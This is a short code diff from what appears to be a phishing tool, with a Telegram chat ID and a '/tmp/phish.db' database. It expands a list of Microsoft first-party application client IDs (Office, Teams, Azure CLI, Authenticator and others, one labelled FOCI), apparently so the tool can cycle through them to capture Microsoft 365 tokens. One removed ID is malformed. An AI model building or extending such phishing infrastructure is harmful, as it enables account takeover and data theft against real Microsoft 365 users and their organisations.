@@ -14,11 +14,18 @@ TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
 CLIENT_IDS = [
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
-    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
-    "27922004-5251-4030-b22d-91ecd9a37ea4",  # Outlook Mobile
-    "b5e26448-a5xd-4d13-9a4b-5b9b40a1520e",  # OneDrive (fallback)
+    'fb78d390-0c51-40cd-8e17-fdbfab77341b',  # Exchange REST API Based PowerShell
+    '00b41c95-dab0-4487-9791-b9d2c32c80f2',  # Office 365 Management
+    '1fec8e78-bce4-4aaf-ab1b-5451cc387264',  # Microsoft Teams
+    'd3590ed6-52b3-4102-aeff-aad2292ab01c',  # Microsoft Office
+    '57336123-6e14-4ebb-8dc2-6cec24c827f9',  # Whiteboard
+    '22098786-6e16-43cc-a27d-191a01a1e3b5',  # Teams (secondary FOCI)
+    '4813382a-8fa7-425e-ab75-3b753aab3abb',  # Microsoft Authenticator
+    '04b07795-8ddb-461a-bbee-02f9e1bf7b46',  # Azure CLI
+    '1950a258-227b-4e31-a9cf-717495945fc2',  # Azure PowerShell
+    '27922004-5251-4030-b22d-91ecd9a37ea4',  # Outlook Mobile
+    'ab9b8c07-8f02-4f72-87fa-80105867a763',  # OneDrive SyncEngine
+    'b26aadf8-566f-4478-926f-589f601d9c74',  # Teams web
 ]
 CLIENT_ID_INDEX = 0
 
